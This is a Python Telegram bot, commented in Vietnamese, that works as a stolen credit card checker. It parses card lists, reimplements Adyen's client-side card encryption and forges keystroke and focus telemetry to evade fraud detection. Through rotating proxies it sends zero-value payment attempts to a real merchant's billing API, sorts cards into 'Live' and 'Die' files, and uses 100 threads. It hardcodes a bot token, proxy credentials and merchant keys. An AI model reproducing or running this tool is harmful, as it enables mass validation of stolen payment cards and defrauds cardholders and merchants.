import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
from datetime import datetime
import threading
import queue
import asyncio
import psutil

# Thư viện Telegram Bot (V20+)
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
from telegram.constants import ParseMode

# Thư viện mã hóa & Requests
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk
import cloudscraper
import requests

# ===================================================================
# === CẤU HÌNH BOT
# ===================================================================
# ĐIỀN TOKEN BOT CỦA BẠN VÀO ĐÂY
BOT_TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I" 

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    """Kiểm tra thuật toán Luhn cho số thẻ."""
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

# ===================================================================
# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key: incorrect split parts")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)
        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")

    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://www.mytheresa.com"
        
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": "3", 
            "referrer": referrer, 
            "numberFieldFocusCount": "1", 
            "numberFieldLog": fake_number_log, 
            "numberFieldClickCount": "1", 
            "numberFieldKeyCount": "16"
        },
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": "4", 
            "referrer": referrer, 
            "cvcFieldFocusCount": "1", 
            "cvcFieldLog": fake_cvc_log, 
            "cvcFieldClickCount": "1", 
            "cvcFieldKeyCount": "3", 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "2"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 3: LOGIC CHECK THẺ (ĐÃ ĐIỀU CHỈNH CHO BOT)
# ===================================================================

def check_card_core(line_card):
    """
    Hàm xử lý logic check thẻ, trả về dict kết quả thay vì in ra console.
    """
    start_time = time.time()
    
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        return {'status': 'ERROR', 'msg': 'Format Error', 'full_line': line_card, 'time': 0}

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        return {'status': 'ERROR', 'msg': 'Luhn Failed', 'full_line': normalized, 'time': 0}

    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    max_retries = 20
    current_try = 0
    success_request = False

    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://www.activecampaign.com',
                'pragma': 'no-cache',
                'referer': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_host = "aus.360s5.com"
            proxy_port = "3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth_str = f"{base_auth}-session-{session_id}:{pass_auth}"
            proxy_full_url = f"http://{proxy_auth_str}@{proxy_host}:{proxy_port}"
            
            proxies = {"http": proxy_full_url, "https": proxy_full_url}

            scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
            )

            response = scraper.post(
                'https://www.activecampaign.com/api/billing/adyen/payments',
                json=json_data, headers=headers, proxies=proxies, timeout=30
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    success_request = True
                    break
                except json.JSONDecodeError:
                    pass
            
        except Exception as e:
            pass
        
        current_try += 1
        time.sleep(1.5)

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    if not success_request:
        return {
            'status': 'ERROR', 
            'result_string': f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NET|MAX_RETRIES|Time:{time_taken}s",
            'time_taken': time_taken
        }

    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))

    msg = ""
    status = ""

    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "LIVE"
        msg = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # 3DS tính là DIE hoặc UNK tùy quy ước, ở đây để DIE cho dễ lọc
        msg = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|Time: {time_taken}s"

    return {
        'status': status,
        'result_string': result_string,
        'time_taken': time_taken
    }

# ===================================================================
# === PHẦN 4: TELEGRAM BOT HANDLERS
# ===================================================================

# Global Stats Storage (Đơn giản hóa cho 1 phiên chạy)
session_stats = {
    'total': 0,
    'checked': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': 0,
    'is_running': False,
    'live_list': [],
    'die_list': []
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Bot Adyen Checker v2.1**\n"
        "💻 Server: Ubuntu\n\n"
        "📝 **Lệnh:**\n"
        "- Gửi file `.txt` để check list (100 luồng).\n"
        "- `/st cc|mm|yy|cvv` để check lẻ.",
        parse_mode=ParseMode.MARKDOWN
    )

async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    try:
        card_raw = text.split('/st ')[1].strip()
    except IndexError:
        await update.message.reply_text("⚠️ Vui lòng nhập đúng định dạng: `/st cc|mm|yy|cvv`", parse_mode=ParseMode.MARKDOWN)
        return

    msg = await update.message.reply_text("🔄 Đang kiểm tra...")
    
    # Chạy trong Thread riêng để không block bot
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, check_card_core, card_raw)
    
    if result.get('status') == 'ERROR' and result.get('msg'):
         await msg.edit_text(f"❌ Lỗi: {result['msg']}")
    else:
        await msg.edit_text(f"📝 Kết quả:\n`{result['result_string']}`", parse_mode=ParseMode.MARKDOWN)

# --- XỬ LÝ FILE (MULTITHREADING) ---

def worker_thread(q, stats_lock):
    while True:
        card = q.get()
        if card is None:
            break
        try:
            res = check_card_core(card)
            with stats_lock:
                session_stats['checked'] += 1
                if res['status'] == 'LIVE':
                    session_stats['live'] += 1
                    session_stats['live_list'].append(res['result_string'])
                elif res['status'] == 'DIE':
                    session_stats['die'] += 1
                    session_stats['die_list'].append(res['result_string'])
                else:
                    session_stats['error'] += 1
        except Exception:
            with stats_lock:
                session_stats['error'] += 1
        finally:
            q.task_done()

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global session_stats
    
    if session_stats['is_running']:
        await update.message.reply_text("⚠️ Đang có một tiến trình chạy. Vui lòng chờ xong.")
        return

    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Chỉ chấp nhận file .txt")
        return

    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    content_str = file_content.decode('utf-8', errors='ignore')
    cards = [line.strip() for line in content_str.splitlines() if line.strip()]

    if not cards:
        await update.message.reply_text("❌ File trống.")
        return

    # Reset Stats
    session_stats = {
        'total': len(cards), 'checked': 0, 'live': 0, 'die': 0, 'error': 0,
        'start_time': time.time(), 'is_running': True,
        'live_list': [], 'die_list': []
    }

    status_msg = await update.message.reply_text(
        f"🚀 Bắt đầu check {len(cards)} thẻ với 100 luồng..."
    )

    # Setup Threading
    q = queue.Queue()
    for card in cards:
        q.put(card)
    
    num_threads = 100
    threads = []
    stats_lock = threading.Lock()

    for _ in range(num_threads):
        t = threading.Thread(target=worker_thread, args=(q, stats_lock))
        t.start()
        threads.append(t)

    # Loop update message
    last_checked = 0
    while any(t.is_alive() for t in threads) or not q.empty():
        await asyncio.sleep(2) # Update mỗi 2s để tránh flood
        
        # Calculate Stats
        elapsed = time.time() - session_stats['start_time']
        checked = session_stats['checked']
        cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
        
        # System Stats
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        
        text = (
            f"⚡ **Adyen Checker Running...**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💳 Total: {session_stats['total']}\n"
            f"✅ Live: {session_stats['live']}\n"
            f"💀 Die: {session_stats['die']}\n"
            f"⚠️ Error: {session_stats['error']}\n"
            f"🔄 Checked: {checked}/{session_stats['total']}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🚀 CPM: {cpm}\n"
            f"🖥 CPU: {cpu}% | RAM: {ram}%\n"
            f"⏱ Time: {int(elapsed)}s"
        )
        
        # Chỉ edit nếu có thay đổi
        if checked != last_checked:
            try:
                await status_msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)
                last_checked = checked
            except Exception:
                pass # Bỏ qua lỗi flood wait nhỏ
        
        if checked == session_stats['total']:
            break

    # Dừng threads
    for _ in range(num_threads):
        q.put(None)
    for t in threads:
        t.join()

    session_stats['is_running'] = False
    
    # Gửi kết quả cuối cùng
    await status_msg.edit_text("✅ **Hoàn tất kiểm tra!** Đang gửi file...", parse_mode=ParseMode.MARKDOWN)

    # Tạo file Live
    if session_stats['live_list']:
        live_content = "\n".join(session_stats['live_list'])
        with open("Live.txt", "w", encoding="utf-8") as f:
            f.write(live_content)
        await update.message.reply_document(document=InputFile("Live.txt"), caption=f"✅ Live Cards ({len(session_stats['live_list'])})")
        os.remove("Live.txt")
    
    # Tạo file Die (nếu cần, thường user chỉ cần Live, nhưng yêu cầu là gửi file)
    if session_stats['die_list']:
         # Để tránh spam file quá nặng, chỉ gửi nếu < 5MB hoặc gửi dưới dạng summary. 
         # Ở đây gửi luôn theo yêu cầu.
        die_content = "\n".join(session_stats['die_list'])
        with open("Die.txt", "w", encoding="utf-8") as f:
            f.write(die_content)
        await update.message.reply_document(document=InputFile("Die.txt"), caption=f"💀 Die Cards ({len(session_stats['die_list'])})")
        os.remove("Die.txt")

# ===================================================================
# === MAIN EXECUTION
# ===================================================================

if __name__ == '__main__':
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        print("LỖI: Chưa nhập Token Bot!")
        sys.exit()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("st", check_single_card))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))

    print("Bot đang chạy...")
    app.run_polling()
